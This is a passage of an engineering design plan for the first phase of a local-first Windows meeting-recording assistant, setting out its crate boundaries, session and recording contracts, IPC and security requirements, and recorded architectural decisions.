# Phase 0 — Repository and contracts

Canonical design plan. `revision: r1` (integration of draft-1 as winner, draft-2 grafts, and the eleven
`verdict: Y` critique findings). Machine skeleton: `spine.yaml` in this directory; every anchor below has
exactly one spine entry and vice versa.

This plan contains **no open design choice**. Every choice the drafts preserved is closed here by an
implementation contract or an ADR; what remains open is evidence-seeking (routed to named spikes whose
outcome cannot change a contract) and typed implementation discretion (private, single-unit, reversible,
mechanically checked).

<!-- anchor: goal -->
## Goal

Turn PLAN.md Phase 0 from a list of deliverables into a set of falsifiable, mechanically checkable contracts
that bind Phase 1–5 implementation. Phase 0 produces structure, contracts and decisions — not meeting
functionality. The test of success is not "the documents exist"; it is that each Phase 0 exit criterion has a
check that fails when the criterion is violated.

The four PLAN Phase 0 exit criteria translate as follows.

| PLAN exit criterion | What makes it falsifiable here |
| --- | --- |
| core boundaries do not require a proprietary backend | `contract-egress-inventory`: `egress-inventory.toml` names every host reachable from source or from a processor/destination manifest, every entry maps to `user_account`, `distribution` or `operating_system` (there is no `first_party` value to write), and a host added to the code without an inventory entry fails the build |
| meeting-service-specific logic cannot leak into the workflow core | `contract-module-boundary-enforcement`: dependency-direction check **plus** forbidden-identifier scan, both proven by a negative fixture that must fail the check |
| the capture engine can continue recording after the UI process terminates | `contract-process-topology`: an integration test kills the UI process while a synthetic capture source is recording and asserts durable chunks keep appearing and the session state stays `recording`; `contract-processing-isolation` adds the harder case — a processor host child aborting mid-job must not perturb either |
| workflow steps and artifacts have stable identifiers and states | `contract-stable-identity` + `contract-workflow-step-idempotency` + `contract-session-state-machine`: identifiers are time-ordered, assigned by the owning component, and appear identically in the DB, in filesystem paths and in export payloads; state transitions are a declared table and undeclared transitions are rejected |

<!-- anchor: scope -->
## Scope

**In scope.**

1. Cargo workspace and crate topology, composition roots, `rust-toolchain.toml`, CI entry.
2. Module boundary rules and the automated dependency-direction check (including its negative fixture).
3. Meeting-session state model: states, transitions, causes, automatic-recording modes, countdown and
   hysteresis timing rules, crash recovery states.
4. Signal contract (envelope, ordering, replayable timeline fixture format) and detector contract
   (purity, evidence-carrying decisions, outcome partition, adapter isolation, fallback).
5. Recording and artifact model: track descriptors, chunking, durability, session timeline with explicit
   gaps, consolidation, artifact addressing and layout, identifier scheme.
6. Engine/UI process topology and the JSON-RPC-over-named-pipe control channel: method and event schema,
   version handshake, reconnect snapshot, transport authorization.
7. Browser-extension localhost channel contract: message schema, authentication, corroboration rule.
8. Local store contract: SQLite (WAL) schema families, writer ownership, migration and schema-version rules.
9. Workflow contract: step identity, idempotency keys, retry classes, artifact lifecycle, edit preservation.
10. Processor contract and destination contract (traits, capability declaration, staging, failure taxonomy,
    budget, export identity, retry queue semantics).
11. Threat model and credential policy: trust boundaries, secret custody, log redaction, egress audit,
    update and adapter-manifest signature trust.
12. Deletion semantics: the two-phase meeting delete, the idempotent purge job and the tombstone that
    survives it. PLAN §3 assigns "retention and deletion" to the application and Phase 0 owns the
    "recording and artifact model", so the *mechanism* of deletion is Phase 0 work even though the default
    retention values are not.
13. Verification tiering: which checks run on any host and which require a Windows runner, and the
    registration rule that makes an unrun Windows check a build failure rather than a silent pass.
14. The repository egress inventory: the single file enumerating every host any component may contact, and
    the check that fails when source reaches a host the file does not declare.
15. Documentation materialization: ADR set, persistent design documents, and the Phase 0 change package
    members, conforming to the repository's dev-docs schemas.

**Out of scope.**

- Real Windows signal collection and real WASAPI capture (Phase 1); Phase 0 fixes the seams and ships a
  synthetic capture source and a fixture-driven signal source behind them.
- Detection heuristics, thresholds and the per-application validation matrix (Phase 1/Phase 5).
- Any transcription, diarization or summarization implementation (Phase 3); Phase 0 fixes the contract and
  the budget, not the engine wiring.
- Real Google Drive / Notion clients (Phase 4); Phase 0 fixes the destination contract, export identity and
  credential custody.
- The browser extension itself (Phase 1); Phase 0 fixes the channel contract it must satisfy.
- Default retention *values* (grace period before purge, automatic expiry) — PLAN §8 explicitly scopes
  those to "before Phase 2". Phase 0 fixes the delete mechanism and makes the grace period a configuration
  point with no default policy attached; see `contract-retention-purge`.
- macOS, video capture, real-time translation, participant bots — PLAN §4 non-goals.

<!-- anchor: approach -->
## Approach

Phase 0 delivers a **contract-carrying skeleton**: type crates, JSON Schemas, a declarative boundary policy,
and just enough executable substance to make each exit criterion fail loudly when violated. Concretely:

- Every cross-boundary shape (IPC message, signal envelope, chunk manifest, artifact manifest, processor
  request/response, destination descriptor, adapter manifest) exists twice: as Rust types in a shared crate
  and as a JSON Schema under `contracts/`. A conformance test asserts the two agree by round-tripping golden
  fixtures, so the schema cannot drift from the types.
- Behavioural seams have a deterministic implementation in Phase 0: `CaptureSource` has a synthetic PCM
  source, `SignalSource` has a fixture-replay source, `Processor` and `Destination` have recording fakes.
  These are the same seams Phase 1–4 implement for real, so Phase 0's tests survive.
- Everything nominal is a *policy file*, not scattered code: `boundary.toml` (allowed crate edges and
  forbidden identifiers), the state transition table, the mode defaults table, the egress inventory. Each has
  a conformance test that reads the policy and the code, so adding a violation fails CI rather than review.

<!-- section: granularity-profile -->
## Granularity profile

`boundary-complete`. Phase 0's product is boundaries and their contracts. The algorithm-heavy interiors
(WASAPI capture loop, detector heuristics, transcription scheduling) belong to Phase 1+ and are deliberately
left free here. Two contracts carry algorithm-shaped correctness anyway — `contract-session-timeline`
(ordering and offset arithmetic) and `contract-chunk-durability` (durability ordering, bounded loss window) —
and are written with explicit ordering, resource and failure bounds rather than deferred, because getting
either wrong silently corrupts every downstream artifact.

Not `spike-first`: the platform unknowns (ESD-1..5) are localized and each is contained behind a seam whose
contract is written to be robust to the spike outcome. Not `algorithm-bound` overall: fixing algorithm
interiors now would over-constrain Phase 1 before any platform measurement exists.

<!-- section: design-dimensions -->
## Design dimensions

Declared so that the coverage argument is auditable rather than reconstructed from per-contract
`Dimension:` lines. Each dimension names the contracts that carry it.

| Dimension | Carried by |
| --- | --- |
| `state_lifecycle` | `contract-process-topology`, `contract-session-state-machine`, `contract-workflow-step-idempotency` |
| `control_flow` | `contract-recording-mode-policy`, `contract-detector-determinism`, `contract-detector-outcome-partition` |
| `data_model` | `contract-signal-envelope`, `contract-session-timeline`, `contract-track-consolidation`, `contract-artifact-addressing`, `contract-stable-identity`, `contract-retention-purge` |
| `concurrency` | `contract-store-ownership` |
| `failure_recovery` | `contract-chunk-durability`, `contract-processing-isolation` |
| `integration_contract` | `contract-ipc-protocol`, `contract-module-boundary-enforcement`, `contract-processor-interface`, `contract-destination-export-idempotency`, `contract-docs-conformance`, `contract-verification-tiering` |
| `security_boundary` | `contract-ipc-transport-authz`, `contract-extension-channel-trust`, `contract-credential-custody`, `contract-release-manifest-trust`, `contract-egress-inventory` |
| `performance_budget` | `contract-processor-budget` |
| `user_observability` | `contract-consent-surface-precondition`, `contract-diagnostic-redaction` |

Two dimensions are deliberately **not** separate rows, for the same reason in both cases: a rule divorced
from the contract that owns the surface it governs cannot be falsified by that contract's own tests.

`resource_management` — every resource bound in this plan (the chunk writer's 60 s per-track queue, the IPC
connection's 256-event outbound queue, the export backlog cap of 500, the processor budget's per-item cost
convergence, the extension channel's rate cap) is a clause of the contract that owns the resource.

`migration_compatibility` — each versioned surface carries its own compatibility rule and its own check:
the store schema in `contract-store-ownership` (`user_version`, forward-only migrations,
`v-store-migration-forward-from-every-version`), the control protocol in `contract-ipc-protocol`
(`engine.hello` semver, major-mismatch refusal, `v-ipc-handshake-mismatch`), the signal timeline fixtures in
`contract-signal-envelope` (header `schema_version` and `adapter_table_version`), and the update and adapter
manifests in `contract-release-manifest-trust` (`manifest_version` strict increase, key rollover, deferral of
an engine replacement during a session). A standalone four-surface contract was drafted and then folded on
user authority, because it re-declared two checks another contract already owned and left only one observable
without a home. Both exclusions are listed here so the coverage argument stays auditable.

Two further dimensions are excluded outright, not folded into an owner. `ui_interaction` is excluded because
Phase 0 ships no user interface behaviour beyond the consent surface's capability declaration, and the
observable rules that would populate it live in `contract-consent-surface-precondition`. `deployment_topology` beyond process
count is excluded because installation, logon-task registration and update rollout are fixed by
`contract-release-manifest-trust` and `contract-process-topology` and add no independent rule set.

<!-- section: accepted-adr-context -->
## Accepted ADR context

Searched: `/workspace/meeting-assistant/docs/adr/` (empty), `/workspace/meeting-assistant/docs/design/`
(empty), `docs/index/drift-index.json` (`{}`). Reviewed accepted ADR ids: none. Applicable accepted ADR ids:
none. This repository has no prior architectural decision record; every decision below is therefore new and
must be recorded, not inherited. The repository *does* carry operational policy that constrains how those
records are written — see `decision-input-adr-schema-shape`, `decision-input-docs-lint-target-placement`,
`decision-input-design-doc-schema`, `decision-input-change-package-members`,
`decision-input-status-transition-whitelist`.

---

# Requirements

The requirement set the contracts below are answerable to; each contract names the requirement
identifiers it discharges.

**Functional.**

- <!-- anchor: fr-001 --> **FR-001** (must) The repository shall provide a cargo workspace whose crate graph declares the workflow
  core, service adapters, platform collectors, capture engine, and composition roots as separate crates with
  declared layer membership.
- <!-- anchor: fr-002 --> **FR-002** (must) When the dependency-direction check runs and any crate outside a composition root depends
  directly, transitively, or through a feature gate on a service-adapter crate, the check shall exit
  non-zero and name the offending dependency path.
- <!-- anchor: fr-003 --> **FR-003** (must) When a core-layer crate contains a supported-service identifier literal, the boundary
  check shall exit non-zero and name the file, line and literal.
- <!-- anchor: fr-004 --> **FR-004** (must) While a session is in the recording state, if the UI process terminates, then the capture
  engine shall continue writing durable chunks and shall keep the session in the recording state.
- <!-- anchor: fr-005 --> **FR-005** (must) When a client connects or reconnects to the capture engine, the engine shall return an
  authoritative session snapshot with a monotonically increasing event sequence number, and the client shall
  render that state rather than a locally inferred state.
- <!-- anchor: fr-006 --> **FR-006** (must) If a client connecting to the engine control channel does not belong to the same
  operating-system user as the engine, then the engine shall refuse the connection before dispatching any
  method and shall record a security diagnostic containing no payload.
- <!-- anchor: fr-007 --> **FR-007** (must) When the detector replays a recorded signal timeline with the same configuration and
  adapter-table version, it shall emit a byte-identical decision sequence across runs and processes, and
  every decision shall cite the signal identifiers it used.
- <!-- anchor: fr-008 --> **FR-008** (must) Where no adapter matches the observed subject, or where a matched adapter's corroboration
  requirement is unmet, the detector shall return unknown or inconclusive respectively and the session shall
  fall back to manual control without arming.
- <!-- anchor: fr-009 --> **FR-009** (must) When the browser extension reports a meeting tab without a corroborating operating-system
  microphone-use signal from the same browser process tree, the detector shall not produce a determinate
  start decision.
- <!-- anchor: fr-010 --> **FR-010** (must) While automatic mode is active and a determinate start decision is produced, the system
  shall arm a cancellable ten-second countdown before capture begins, and cancellation shall suppress
  re-arming for the same meeting identity until that identity's signals have been continuously absent for
  sixty seconds.
- <!-- anchor: fr-011 --> **FR-011** (must) If neither the engine-owned operating-system notification channel nor an attached client
  declaring indicator and cancel capabilities can present the countdown, then the system shall not begin
  automatic capture and shall record the suppressed decision with its cause.
- <!-- anchor: fr-012 --> **FR-012** (must) When a determinate end decision is produced, the system shall hold the session for a
  sixty-second hysteresis window during which a continuing signal returns the session to recording on the
  same tracks without creating a new session.
- <!-- anchor: fr-013 --> **FR-013** (must) The capture engine shall write each track as fixed-duration chunks that become durable by
  atomic rename before the manifest records them, bounding audio loss on abrupt termination to the single
  in-progress chunk.
- <!-- anchor: fr-014 --> **FR-014** (must) When the engine restarts and finds a session left in the recording state, it shall recover
  the session from durable chunks under the same session identifier, mark the interruption explicitly on the
  timeline, and finalize rather than silently resume.
- <!-- anchor: fr-015 --> **FR-015** (must) The recording model shall express every chunk's position as a sample offset on its own
  track timeline, shall represent missing audio as explicit gap records, and shall not derive any timestamp
  from concatenation order.
- <!-- anchor: fr-016 --> **FR-016** (must) When track consolidation completes, the system shall verify that the decoded output is
  sample-identical to the durable chunk sequence with recorded gaps rendered as silence before deleting any
  chunk.
- <!-- anchor: fr-017 --> **FR-017** (must) The system shall assign time-ordered unique identifiers to meetings, sessions, tracks,
  chunks, artifacts, workflow steps and exports, and shall reproduce each identifier verbatim in database
  rows, filesystem path segments and export payloads.
- <!-- anchor: fr-018 --> **FR-018** (must) When a workflow step whose step key is already recorded as succeeded is enqueued again,
  the workflow runtime shall return the recorded result without re-executing any side effect.
- <!-- anchor: fr-019 --> **FR-019** (must) When a processor, processor version or processor configuration changes, the workflow
  runtime shall derive a new step identity and shall retain the previous result rather than overwriting it.
- <!-- anchor: fr-020 --> **FR-020** (must) The processor contract shall pass only explicitly staged input files to external
  processors, shall invoke them with an argument vector built from a manifest-declared template, and shall
  never construct a shell command line or place a secret in process arguments.
- <!-- anchor: fr-021 --> **FR-021** (must) When a processor runs, it shall report monotonically non-decreasing progress at least once
  per work item and shall observe cancellation within one work item and within five seconds.
- <!-- anchor: fr-022 --> **FR-022** (must) If local transcription of a two-hour recording exceeds the real-time budget, then the
  system shall emit a budget warning and shall continue the step rather than failing it.
- <!-- anchor: fr-023 --> **FR-023** (must) When an export is retried after a crash or network failure, the destination shall
  reconcile against the recorded remote identity or the external-identifier marker before creating any
  remote object, so that no duplicate remote object is created.
- <!-- anchor: fr-024 --> **FR-024** (must) The artifact store shall address artifacts as a root identifier plus a relative path
  composed only of generated identifiers, so that relocating the configurable artifact root does not
  invalidate any stored reference.
- <!-- anchor: fr-025 --> **FR-025** (must) If an update or adapter manifest fails Ed25519 verification, declares a manifest version
  not greater than the installed version, or declares an artifact digest that does not match the file on
  disk, then the system shall reject it before using any value it declares.
- <!-- anchor: fr-026 --> **FR-026** (must) The Phase 0 change package, its ADRs and its persistent design documents shall conform to
  the repository documentation schemas, lint target placement and status transition whitelist.
- <!-- anchor: fr-027 --> **FR-027** (must) While a session is in the `candidate` or `arming` state, the system shall write no audio
  sample under the artifact root and shall persist session metadata only, so that a meeting that is detected
  but never recorded leaves no audio on durable storage.
- <!-- anchor: fr-028 --> **FR-028** (must) When an armed countdown is cancelled, expires without entering the recording state, or is
  abandoned by a restart, the system shall leave no chunk file and no audio byte under the artifact root for
  that session.
- <!-- anchor: fr-029 --> **FR-029** (must) When a user deletes a meeting, the system shall immediately make it invisible to every
  view, cancel its in-flight workflow steps, and shall purge its artifact directory and its derived rows,
  retaining only a tombstone carrying the meeting identifier, its timestamps and the identifiers of the
  remote objects it exported.
- <!-- anchor: fr-030 --> **FR-030** (must) When a processing step executes work that loads a native inference library or runs an
  external program, the system shall execute that work in a child process supervised by the engine, so that
  the work's abnormal termination terminates only that child process.

**Non-functional.**

- <!-- anchor: nfr-001 --> **NFR-001** (must) Secrets shall exist only in the operating-system credential store and shall never appear
  in application files, databases, artifacts, logs or process arguments.
- <!-- anchor: nfr-002 --> **NFR-002** (must) Diagnostic output shall contain no meeting audio, transcript text, summary text, meeting
  title, participant name or full URL.
- <!-- anchor: nfr-003 --> **NFR-003** (must) No component on the detection, capture, workflow, processing or export path shall depend
  on a first-party backend service.
- <!-- anchor: nfr-004 --> **NFR-004** (must) Local transcription without a GPU shall complete a two-hour recording within two hours of
  wall-clock time, with overrun treated as a warning.
- <!-- anchor: nfr-005 --> **NFR-005** (must) Detection inputs shall carry no DOM structure, selector, control label, screen
  coordinate, accessibility path or full URL, enforced by the closed signal envelope schema.
- <!-- anchor: nfr-006 --> **NFR-006** (must) Every outbound send shall append a local audit record naming destination, host, artifact
  identifier, byte count and outcome, and every egress host shall appear in the egress inventory.
- <!-- anchor: nfr-007 --> **NFR-007** (must) The application database shall reside under the local application-data directory
  regardless of the configured artifact root.
- <!-- anchor: nfr-008 --> **NFR-008** (must) The boundary check, the schema conformance checks, the egress inventory check and the
  documentation conformance check shall run in continuous integration on every push and pull request in the
  portable tier and shall block merge on failure; the Windows tier shall run every registered T2
  verification and shall block Phase 0 completion on failure.
- <!-- anchor: nfr-009 --> **NFR-009** (must) No crate on the capture path shall depend on the workflow, processor or destination
  crates, and no crate other than the processor host binary shall link a native inference library, so that a
  processing failure cannot reach the recording path.
- <!-- anchor: nfr-010 --> **NFR-010** (must) The contract-core crates shall build and pass their T0 and T1 verifications on a
  non-Windows host, and every T2 verification declared by this plan shall be registered in the Windows tier
  manifest.

---

# Decision inputs

Every candidate, constraint and handoff that could change a design contract is kept here with its authority,
so that the integrator dispositions all of them and nothing is dropped in silence. `authority: constraint`
means the plan may not contradict it; `candidate` means it is a proposal that must be compared against a
baseline; `handoff` means an upstream phase expects this plan to carry it.

<!-- section: decision-input-no-proprietary-backend -->
### decision-input-no-proprietary-backend

Source: user requirement, `PLAN.md` §2 ("Do not operate a proprietary workflow backend service") and §9.6.
Authority: constraint. Candidate: no component in the detection, capture, workflow, processing or export path
may depend on a first-party service. Comparison baseline: a thin first-party relay for OAuth token exchange
and update metadata, which is the conventional desktop design and would simplify
`contract-release-manifest-trust` and Drive OAuth. Rejected by authority; the consequence is that update and
adapter manifests must be verified client-side by signature (`contract-release-manifest-trust`) and OAuth must
use the installed-app PKCE flow with no client secret. Requirements: NFR-003, FR-025.

<!-- section: decision-input-no-dom-detection -->
### decision-input-no-dom-detection

Source: user requirement, `PLAN.md` §3 ("Resilience to meeting-service changes"). Authority: constraint.
Candidate: detection uses only signed application/package identity, process lifecycle, audio-session
lifecycle, microphone usage, audio activity, optional calendar context, explicit user action, and — for
browser meetings only — tab URL host pattern plus tab audible state from the detection-only extension.
Comparison baseline: UI Automation / accessibility-tree probing, which is markedly easier for start/end
detection and is what most competing products do. Rejected by authority. Consequence: the detector contract is
written against a *signal timeline*, and `contract-signal-envelope` fixes what a signal may contain so that no
DOM- or coordinate-derived fact can enter the pipeline in the first place. Requirements: NFR-005, FR-007.

<!-- section: decision-input-capture-engine-separate-process -->
### decision-input-capture-engine-separate-process

Source: user requirement, `PLAN.md` §8 "Decided" and the Phase 0 deliverable list ("ADR: the capture engine
runs in a process separate from the UI"). Authority: constraint. Candidate: capture runs in its own OS
process; UI failure or restart never interrupts recording. Comparison baseline: a background thread inside the
Tauri process, which removes all IPC surface and is far simpler. Rejected by authority, and independently by
the risk that a WebView2 crash or a native processor crash takes the recording with it. Requirements: FR-004,
FR-005. ADR: `adr-20260903-capture-engine-process-isolation`.

<!-- section: decision-input-desktop-stack -->
### decision-input-desktop-stack

Source: user decision, `recovery-decisions.json#unknown-desktop-framework`. Authority: constraint. Candidate:
capture engine is a standalone Rust process using `windows-rs` (WASAPI process loopback, AppX/package
identity, Windows Credential Manager); UI is Tauri 2 + WebView2; local inference via whisper.cpp and
sherpa-onnx Rust bindings. Comparison baseline: .NET 8 + WinUI 3 (first-class WASAPI/AppX interop, single
language for engine and UI) and Electron + a Rust sidecar (largest UI ecosystem). Adopted as decided; the
consequences this plan must absorb are that the engine and the UI are different languages at the boundary only
if the UI's business logic lives in Rust (it does — the Tauri backend is Rust), and that Tauri's updater
becomes the update mechanism (`decision-input-update-manifest-distribution`). Requirements: FR-001, FR-004.
ADR: `adr-20260903-desktop-stack-and-ipc`.

<!-- section: decision-input-ipc-mechanism -->
### decision-input-ipc-mechanism

Source: user decision, `recovery-decisions.json#unknown-desktop-framework` (IPC clause). Authority:
constraint. Candidate: JSON-RPC over a Windows named pipe between UI and engine. Comparison baseline: a
loopback TCP socket (simpler cross-platform story for Phase 6 macOS, but adds a listening local port and
therefore an attack surface identical to the extension channel's) and a shared-memory ring plus an event
(lowest latency for level meters). Adopted as decided. The consequence this plan must fix is that a named pipe
has no origin concept, so authorization is by pipe ACL and client-token SID check
(`contract-ipc-transport-authz`), and that JSON-RPC has no built-in resync, so a snapshot + sequence number is
required (`contract-ipc-protocol`). Requirements: FR-005, FR-006.

<!-- section: decision-input-boundary-toolchain -->
### decision-input-boundary-toolchain

Source: user decision, `recovery-decisions.json#unknown-desktop-framework` (dependency-check clause).
Authority: constraint. Candidate: cargo workspace with per-crate boundaries, `cargo-deny` plus a
repository-owned lint that rejects forbidden crate dependencies. Comparison baseline: relying on Rust module
privacy and code review alone (zero tooling, zero enforcement) and using `cargo-deny`'s `bans` section alone
(catches third-party crates but not first-party crate-to-crate edges, which is exactly the leak PLAN cares
about). Adopted as decided, with the addition — required to make the exit criterion falsifiable — that the
repository lint also scans for service identifier literals in core crates and that the lint has a negative
fixture. Requirements: FR-002, FR-003, NFR-008. ADR: `adr-20260903-workspace-boundary-enforcement`.

<!-- section: decision-input-db-artifact-layout -->
### decision-input-db-artifact-layout

Source: user decision, `recovery-decisions.json#unknown-db-artifact-layout`. Authority: constraint.
Candidate: SQLite in WAL mode at `%LOCALAPPDATA%\MeetingAssistant\db\`, holding session state, workflow queue
and export state; artifacts at
`%LOCALAPPDATA%\MeetingAssistant\meetings\<meeting-id>\{chunks,transcript,summary,exports}\` with a
user-configurable root. Comparison baseline: a single embedded key-value store (redb/sled — no SQL, simpler
concurrency story) and putting the DB inside the configurable artifact root (one directory to back up).
Adopted as decided, with one derived constraint this plan makes explicit: because the artifact root is
user-configurable it may be a network share or a removable drive, where SQLite WAL's shared-memory file is
unreliable — so the DB path stays under `%LOCALAPPDATA%` and is *not* relocatable, and artifact references are
stored as `(root_id, relative_path)`. Requirements: FR-024, NFR-007. ADR:
`adr-20260903-local-store-and-artifact-layout`.

<!-- section: decision-input-audio-format -->
### decision-input-audio-format

Source: user decision, `recovery-decisions.json#unknown-audio-format`. Authority: constraint. Candidate: per
track (microphone, loopback), 16 kHz mono 16-bit PCM WAV chunks of 30 seconds during recording; after the
meeting ends, chunks are consolidated per track into FLAC; optional Opus export for sharing. Comparison
baseline: writing Opus/OGG directly during capture (much smaller, but a torn Ogg page after a hard kill costs
a page rather than a chunk and complicates sample-exact recovery) and 48 kHz stereo capture with downmix at
processing time (retains fidelity for future re-processing at ~6x the disk cost). Adopted as decided.
Consequences fixed here: 16 kHz mono is the archival rate, so any future processor requiring more is a
re-capture concern rather than a re-processing one, recorded as an accepted consequence in
`adr-20260903-audio-format-and-chunking`; and consolidation must be verified lossless before
the WAV chunks are deleted (`contract-track-consolidation`). Requirements: FR-013, FR-016. ADR:
`adr-20260903-audio-format-and-chunking`.

<!-- section: decision-input-recording-modes -->
### decision-input-recording-modes

Source: user decision, `recovery-decisions.json#unknown-auto-recording-mode-definition`. Authority:
constraint. Candidate: three modes — `auto` (10-second countdown after detection, cancellable from the
notification), `ask` (notify on detection, recording starts only on an explicit Start), `manual` (no detection
notifications); per-application override; defaults desktop=auto, browser=ask; end uses a 60-second hysteresis
after the end signal with a "still in the meeting?" notification that can extend it. Comparison baseline: a
single global auto/manual toggle (simplest, but forces one consent posture for a browser tab and a signed
desktop app alike). Adopted as decided. This plan adds the timing semantics the decision does not state —
which clock the countdown uses, what happens across suspend/resume, and what happens when no consent surface
is attached (`contract-recording-mode-policy`, `contract-consent-surface-precondition`). Requirements: FR-010,
FR-011, FR-012. ADR: `adr-20260903-automatic-recording-modes`.

<!-- section: decision-input-initial-adapters -->
### decision-input-initial-adapters

Source: user decision, `recovery-decisions.json#unknown-initial-adapters`. Authority: constraint. Candidate:
local transcription = whisper.cpp `large-v3-turbo` (Japanese and English, GPU optional); external
transcription = OpenAI speech-to-text API; diarization of the remote (loopback) track = sherpa-onnx
speaker-embedding clustering; summarization = Claude API Messages (default model `claude-sonnet-5`) plus an
OpenAI-compatible adapter. Comparison baseline: faster-whisper via a Python sidecar (better throughput
tooling, but adds a Python runtime to the installer) and cloud-only transcription (no model download, but
violates the offline recording/processing posture users of a local-first recorder expect). Adopted as decided.
Phase 0 fixes only the *contract* these adapters must satisfy, including model-file provenance as an
operational input (`contract-processor-interface`). Requirements: FR-020, FR-021. ADR:
`adr-20260903-initial-processor-adapters`.

<!-- section: decision-input-transcription-budget -->
### decision-input-transcription-budget

Source: user decision, `recovery-decisions.json#unknown-local-transcription-time-budget`. Authority:
constraint. Candidate: without a GPU, local transcription of a two-hour recording must finish within two hours
(at most 1.0x real time); progress display and cancellation are mandatory; exceeding the budget is a warning,
not a failure. Comparison baseline: treating budget overrun as a step failure that falls back to the external
API (bounded latency, but silently sends meeting content off-device — an unacceptable default under PLAN §7's
"external transmission is explicit"). Adopted as decided. Requirements: FR-021, FR-022, NFR-004. ADR:
`adr-20260903-local-transcription-budget`.

<!-- section: decision-input-update-manifest-distribution -->
### decision-input-update-manifest-distribution

Source: user decision, `recovery-decisions.json#unknown-update-adapter-manifest-distribution`. Authority:
constraint. Candidate: static hosting on GitHub Releases; code-signed installer; update manifests and adapter
manifests are Ed25519-signed JSON verified by the Tauri updater and by the application before adapter
activation; no backend service. Comparison baseline: relying on the Authenticode signature of downloaded
binaries alone (no manifest signing — but then the *manifest* that names which binary to fetch is unsigned,
and rollback and adapter enablement are unprotected). Adopted as decided. This plan adds rollback protection
and key-rotation handling, which the decision does not state (`contract-release-manifest-trust`).
Requirements: FR-025. ADR: `adr-20260903-update-and-manifest-distribution`.

<!-- section: decision-input-meet-extension-detection-only -->
### decision-input-meet-extension-detection-only

Source: user requirement, `PLAN.md` §8 "Decided" and §4. Authority: constraint. Candidate: Google Meet
detection uses a detection-only browser extension reporting tab URL host and audible state; browser audio
stays on the process loopback path; tab-level audio capture via the extension is post-MVP. Comparison
baseline: `chrome.tabCapture` for clean per-tab audio, rejected upstream because it requires a user click per
meeting. Adopted as decided. Consequences fixed here: extension signals are *non-authoritative* and must be
corroborated by an OS-level microphone-use signal from the same browser process before an automatic start
(`contract-extension-channel-trust`), and browser loopback tracks are marked with a contamination risk flag
(`contract-session-timeline`). Requirements: FR-009. ADR:
`adr-20260903-extension-localhost-channel-trust`.

<!-- section: decision-input-drive-oauth-pkce -->
### decision-input-drive-oauth-pkce

Source: user requirement, `PLAN.md` §8 "Decided" and §6 Phase 4. Authority: constraint. Candidate: Google
Drive uses the installed-app OAuth flow with PKCE and the `drive.file` scope only. Comparison baseline:
`drive` full scope, which would let the app find pre-existing folders by name; rejected upstream. Consequence
fixed here: because `drive.file` only sees objects the app created, export idempotency cannot rely on a global
name search and must rely on the recorded remote identity (`contract-destination-export-idempotency`).
Requirements: FR-023, NFR-001.

<!-- section: decision-input-notion-internal-token -->
### decision-input-notion-internal-token

Source: user requirement, `PLAN.md` §8 "Decided". Authority: constraint. Candidate: Notion uses a
user-created internal integration token, no OAuth redirect. Comparison baseline: Notion public OAuth, which
would require a registered redirect and, in practice, a hosted callback — colliding with
`decision-input-no-proprietary-backend`. Consequence: the credential custody contract must handle a long-lived
non-refreshable secret whose only invalidation signal is a 401 (`contract-credential-custody`). Requirements:
NFR-001, FR-023.

<!-- section: decision-input-cli-adapter-postmvp -->
### decision-input-cli-adapter-postmvp

Source: user requirement, `PLAN.md` §8 "Decided" and §6 Phase 3. Authority: constraint. Candidate: the
restricted Claude Code / Codex CLI summarization adapter is post-MVP. Comparison baseline: shipping it in the
MVP. Deferred upstream. Consequence for Phase 0: the processor contract must nonetheless already forbid
arbitrary shell commands as configuration and require explicit file staging (PLAN §7), because those rules are
what make a future CLI adapter admissible at all — they are cheaper to establish now than to retrofit.
Requirements: FR-020.

<!-- section: decision-input-transcription-languages -->
### decision-input-transcription-languages

Source: user requirement, `PLAN.md` §8 "Decided" and §6 Phase 3. Authority: constraint. Candidate: supported
transcription languages are Japanese and English. Comparison baseline: language-agnostic auto-detection with
no declared support set. Consequence: the processor capability declaration carries an explicit language set,
and a request for an unsupported language is a typed permanent failure rather than a silent
best-effort transcription (`contract-processor-interface`). Requirements: FR-020.

<!-- section: decision-input-adr-schema-shape -->
### decision-input-adr-schema-shape

Source: repository policy, `docs/schemas/adr.schema.json` via `recovery.json#discovered-adr-schema-requirements`.
Authority: constraint. Candidate: every ADR authored here declares `decision_makers` (minItems 1) and uses the
tripolar `consequences: {positive, negative, neutral}` object form with non-empty arrays; no undeclared
top-level fields. Comparison baseline: the legacy flat `consequences` array, admissible only for ADRs dated
before 2026-07-09 and therefore inadmissible for this repository. Consequence: the ~14 ADRs proposed by this
plan each need a named decision maker and a genuinely non-empty `negative` list — which is a useful forcing
function, since an ADR with no stated downside is usually an undocumented assumption. Requirements: FR-026.

<!-- section: decision-input-docs-lint-target-placement -->
### decision-input-docs-lint-target-placement

Source: repository policy, `docs/.docs-config.yaml` via `recovery.json#discovered-docs-lint-target-placement`.
Authority: constraint. Candidate: ADRs live at `docs/adr/*.md` (non-recursive glob) and design documents at
`docs/design/**/*.md` (recursive). Comparison baseline: grouping ADRs into `docs/adr/2026/` subdirectories,
which would silently drop them from the index and lint. Consequence: with ~14 ADRs the flat directory must
carry ordering in the filename; this plan uses `adr-<YYYYMMDD>-<slug>.md`. Requirements: FR-026.

<!-- section: decision-input-design-doc-schema -->
### decision-input-design-doc-schema

Source: repository policy, `docs/schemas/design.schema.json` via
`recovery.json#discovered-design-doc-schema-structure`. Authority: constraint. Candidate: persistent design
documents require `scope_type`, `responsibilities[RESP-###]`, `invariants[INV-### + enforcement]`,
`boundaries{provides,consumes,forbidden}`, `variability{fixed,free}`, `capabilities`,
`failure_responsibilities`, `trust_boundaries`, `compatibility_policies`; `unevaluatedProperties: false`.
Comparison baseline: keeping all Phase 0 contract text inside the change package only. Consequence: the parts
of Phase 0 that bind *future* agent decisions — module boundaries, session lifecycle, trust boundaries — must
be promoted to `docs/design/` with `enforcement` naming the actual check, while file inventories and
Phase-0-only scaffolding stay in the change package. Requirements: FR-026.

<!-- section: decision-input-change-package-members -->
### decision-input-change-package-members

Source: repository policy, `docs/changes/change-20260903-phase0-repository-and-contracts/change.md` via
`recovery.json#discovered-change-package-required-members`. Authority: constraint. Candidate: the change
declares profile `sdd@1` with three required members (`requirements`, `implementation`, `verification`), all
currently empty templates that the integrator must materialize. Comparison baseline: recording Phase 0 output
only as ADRs and design docs, leaving required members empty — which leaves the manifest unfulfilled.
Requirements: FR-026.

<!-- section: decision-input-status-transition-whitelist -->
### decision-input-status-transition-whitelist

Source: repository policy, `docs/.transition-table.yaml` via
`recovery.json#discovered-docs-status-transition-whitelist`. Authority: constraint. Candidate: change status
moves `draft→ready→active→closing→done`; ADR status moves `proposed→accepted|rejected` and only then to
